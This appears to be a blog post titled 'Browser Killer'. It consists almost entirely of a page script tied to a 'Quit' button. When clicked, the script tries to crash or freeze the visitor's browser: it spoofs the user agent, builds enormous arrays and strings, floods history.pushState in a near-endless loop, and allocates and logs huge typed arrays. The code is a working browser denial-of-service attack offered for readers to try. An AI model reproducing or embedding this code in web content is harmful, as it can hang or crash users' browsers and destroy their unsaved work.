    <title>Browser Killer</title>
    <url>/2021/browser-killer/</url>
    <content><![CDATA[<p>Just open console and try!</p>
<p><button href="#" id="browser-killer" style="display: block;">Quit</button></p>
<script>
    document.getElementById("browser-killer").addEventListener("click", function (event) {
        try {
            navigator.__proto__.__defineGetter__("userAgent", () => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
        } catch (e) {}
        try {
            console.log(new Array(-1>>>0).join(','));
        } catch (e) {}
        try {
            var input = document.createElement("input");
            input.type = "date";
            input.type = "text";
        } catch (e) {}
        try {
            var total;
            for (var i = 0>>>0;i < -1>>>0;i++) {
                total = total + i.toString();
                history.pushState(0,0,total);
            }
        } catch (e) {}
        var arr = [];
        if (window.BigUint64Array) arr.push(window.BigUint64Array);
        if (window.Uint32Array) arr.push(window.Uint32Array);
        if (window.Uint16Array) arr.push(window.Uint16Array);
        if (window.Array) arr.push(window.Array);
        arr.forEach(function (Construct) {
            for (var i = 0 >>> 0;i <= (64 >>> 0);++i) {
                try {
                    var a = (new Construct(Number.MAX_SAFE_INTEGER >>> i));
                    var b = {};
                    try {
                        console.log(a.join(","));
                    } catch (e) {}
                    try {
                        console.log(JSON.stringify(a));
                    } catch (e) {}
                } catch (e) {}
            }
        });
        event.preventDefault();
    })
</script>]]></content>
